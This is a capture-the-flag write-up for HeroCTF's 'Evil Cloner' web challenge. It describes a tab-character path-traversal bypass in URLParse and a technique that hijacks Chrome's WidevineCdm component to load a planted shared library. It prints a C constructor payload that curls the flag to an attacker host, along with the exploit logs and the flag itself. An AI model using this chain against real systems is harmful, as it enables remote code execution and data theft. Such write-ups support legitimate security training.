# Evil Cloner

### Category

Web

### Difficulty

Hard

### Author

Worty

### Description

My website just got cloned :(( could you help me removing the data from this remote evil server ? :(

Deploy an instance at [https://deploy.heroctf.fr/](https://deploy.heroctf.fr/).

### Files

- [evil_cloner.zip](evil_cloner.zip)

### Write Up

The clone functionality can be used on the website, allowing you to clone an entire website and download a zip file containing the cloned website's source code. The cloner is homemade; the code can be found in the file `challenge/src/services/cloner.js`. There is quite a lot of code in it, and the sanitization appears to be good:

```js
//In file challenge/src/services/cloner.js
async function downloadToFile(resourceUrl, destPath, controller) {
  //[...]
  let finalPath = destPath;
  const headerName = filenameFromHeaders(res.headers);
  if (headerName) {
    finalPath = path.dirname(destPath)+"/"+headerName;
  }
  if(finalPath.includes("..")) {
    return false;
  }
  //[...]
}
```

The code here seems to check if the original filename or the filename sent via headers contains malicious elements such as `..` to avoid path traversal vulnerabilities. However, if we take a look at the code after this check:

```js
//In file challenge/src/services/cloner.js
async function downloadToFile(resourceUrl, destPath, controller) {
  //[...]
  const buf = Buffer.from(await res.arrayBuffer());
  finalPath = new URLParse(finalPath).pathname;
  if(finalPath == false) {
    return false;
  }
  await fs.writeFile(finalPath, buf);
  return true;
}
```

Here, we can see that `finalPath` is extracted from the `pathname` property of the result of `URLParse`, to prevent path traversal again if the previous check was not enough. However, this library makes some replacements on the filename pathname, for example:

```js
var test = new URLParse(".\t./.\t./");
console.log(test.pathname);
// ../../
```

This library removes bad characters from the pathname before returning it, allowing us to bypass the previous check and gain a path traversal vulnerability using the `Content-Disposition` header!

Looking at the `docker-compose.yml` file, we can observe a few things:

```yaml
services:
  app:
    build: ./challenge
    ports:
      - "3000:3000"
    environment:
      - DB_HOST=db
      - DB_PORT=3306
      - DB_USER=evilcloner_user
      - DB_PASSWORD=evilcloner_password
      - DB_NAME=evilcloner_db
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped
    read_only: true
    tmpfs:
      - /tmp:mode=1733,exec
      - /usr/app/data:mode=1733
# other database service but not relevant for this challenge
```

The Docker container is launched as `read-only`, but the `/tmp/` folder as well as the `/usr/app/data` folder can be written to. This means that the path traversal will not be usable on the NodeJS app because permission will be denied.

The only way now is to abuse a feature of the Chrome browser to gain Remote Code Execution. Let's take a closer look at the bot source code (the one used in the first step):

```js
//In file src/services/bot.js#L22
const browser = await puppeteer.launch({
    headless: 'new',
executablePath: "/usr/bin/google-chrome",
args,
ignoreDefaultArgs: ["--disable-client-side-phishing-detection", "--disable-component-update", "--force-color-profile=srgb"]
});
```

We can observe that a few parameters are removed from the basic Puppeteer command line:
- --disable-client-side-phishing-detection
- --disable-component-update
- --force-color-profile=srgb

Two of them are useless and are here just to disguise the real one. The interesting one here is `--disable-component-update`. Without this flag, components such as WidevineCDM will be available in the Chrome browser, which may seem a bit useless at first but this is my way to gain RCE (maybe there are others).

Just one more thing: if we look at the register code, we can see that the application is creating, for each user, a Chrome data directory to be reused between calls to the bot, and this will be useful for the exploit.

In fact, without this flag there are two more folders in Chrome's user data directory:
- ZxcvbnData
- WidevineCdm

Let's ignore ZxcvbnData and focus on the WidevineCdm folder, which contains one JSON file named `latest-component-updated-widevine-cdm`:

```json
{
    "LastBundledVersion":"4.10.2891.0",
    "Path":"/opt/google/chrome/WidevineCdm"
}
```

This seems to be a configuration file pointing to a folder containing other configuration information:

```sh
/opt/google/chrome/WidevineCdm> ls
LICENSE  _platform_specific  manifest.json
```

The `manifest.json` file contains the following information:

```json
{
  "manifest_version": 2,
  "update_url": "https://clients2.google.com/service/update2/crx",
  "name": "WidevineCdm",
  "description": "Widevine Content Decryption Module",
  "version": "4.10.2891.0",
  "minimum_chrome_version": "68.0.3430.0",
  "x-cdm-module-versions": "4",
  "x-cdm-interface-versions": "10",
  "x-cdm-host-versions": "10",
  "x-cdm-codecs": "vp8,vp09,avc1,av01",
  "x-cdm-persistent-license-support": false,
  "x-cdm-supported-encryption-schemes": [
    "cenc",
    "cbcs"
  ],
  "icons": {
    "16": "imgs/icon-128x128.png",
    "128": "imgs/icon-128x128.png"
  },
  "platforms": [
    {
      "os": "linux",
      "arch": "x64",
      "sub_package_path": "_platform_specific/linux_x64/"
    },
    {
      "os": "linux",
      "arch": "arm64",
      "sub_package_path": "_platform_specific/linux_arm64/"
    }
  ]
}
```

It seems to indicate (again) a path to a folder:

```sh
/opt/google/chrome/WidevineCdm/_platform_specific/linux_x64> ls
libwidevinecdm.so
```

All of this allows Chrome to load this shared library at startup to expose WidevineCDM APIs. The first file, `latest-component-updated-widevine-cdm`, pointing to the configuration folder seems very interesting to overwrite, and we can, because Chrome user's data directories are saved in `/tmp/`, which is a tmpfs and writable (even if the docker is read-only!).

I will not expose my research here, but tl;dr:
- You can't modify the `manifest.json` file (some signatures are in place)
- The shared library can be changed to another one executing arbitrary code
- You can modify the `latest-component-updated-widevine-cdm` file to make the `Path` parameter point to another folder; the manifest will be read and the shared library will be loaded if:
    - This folder is in the Chrome installation directory (here `/opt/google/chrome/`)
    - This folder is in the user's `$HOME` directory

Looking at the bot reveals that the `HOME` variable is set to `/tmp/`, so we meet all the conditions here. The exploit chain is the following:
- Using the scraper functionality:
    - Force the download of a file named `.\t./.\t./.\t./.\t./.\t./.\t./tmp/[YOUR_DATA_DIR]/WidevineCdm/latest-component-updated-widevine-cdm`
    - Force the download of a file named `manifest.json`
    - Force the download of a file named `_platform_specific/linux_x64/libwidevinecdm.so` (if you look at the scraper code, it's creating folders to match the website tree)
- Use the first functionality to start Chrome and gain RCE!

Using the solve script on my local instance:

```bash
python3 solve.py http://localhost:3000 http://192.168.1.13:5000 192.168.1.13:5000
[EXPLOIT] - Register with creds a3e63aa0-bc9b-11f0-a18b-f4267968ed86:a3e63aa0-bc9b-11f0-a18b-f4267968ed86
[EXPLOIT] - Login with creds a3e63aa0-bc9b-11f0-a18b-f4267968ed86:a3e63aa0-bc9b-11f0-a18b-f4267968ed86
[EXPLOIT] - Account information:
{'id': 2, 'username': 'a3e63aa0-bc9b-11f0-a18b-f4267968ed86', 'data_dir': 'c143o8xo', 'clone_dir': '/tmp/clone_files/9d5j4m8m'}
[EXPLOIT] - Calling bot for datadir to initialize
[EXPLOIT] - Starting flask server as deamon with payload {"LastBundledVersion":"4.10.2891.0","Path":"/tmp/clone_files/9d5j4m8m/192.168.1.13:5000/"} and chrome_datadir: c143o8xo
[EXPLOIT] - Sleeping to be sure flask has started
 * Serving Flask app 'solve'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.1.13:5000
Press CTRL+C to quit
[EXPLOIT] - Compiling following code:
#include <stdlib.h>

__attribute__((constructor))
void pwn() {
    system("/bin/bash -c 'curl http://192.168.1.13:5000/flag --data \"flag=$(cat /flag*)\"'");
}

[EXPLOIT] - Sending URL of payload to challenge
192.168.32.3 - - [08/Nov/2025 13:08:36] "GET / HTTP/1.1" 200 -
192.168.32.3 - - [08/Nov/2025 13:08:36] "GET /image.png HTTP/1.1" 200 -
192.168.32.3 - - [08/Nov/2025 13:08:36] "GET /_platform_specific/linux_x64/libwidevinecdm.so HTTP/1.1" 200 -
192.168.32.3 - - [08/Nov/2025 13:08:36] "GET /image3.png HTTP/1.1" 200 -
[EXPLOIT] - Sleeping to be sure path traversal has worked
[EXPLOIT] - Starting chrome on remote to trigger .so file
[EXPLOIT] Got the flag : Hero{2f510d29776569e7d485248e528b62d3}
192.168.32.3 - - [08/Nov/2025 13:08:41] "POST /flag HTTP/1.1" 200 -
[EXPLOIT] Got the flag : Hero{2f510d29776569e7d485248e528b62d3}
192.168.32.3 - - [08/Nov/2025 13:08:41] "POST /flag HTTP/1.1" 200 -
[EXPLOIT] - Sleeping to be sure flag has been received
[EXPLOIT] - Exploit triggered ! You should have received the flag !
[EXPLOIT] - Cleaning files
```

### Flag

Hero{2f510d29776569e7d485248e528b62d3}
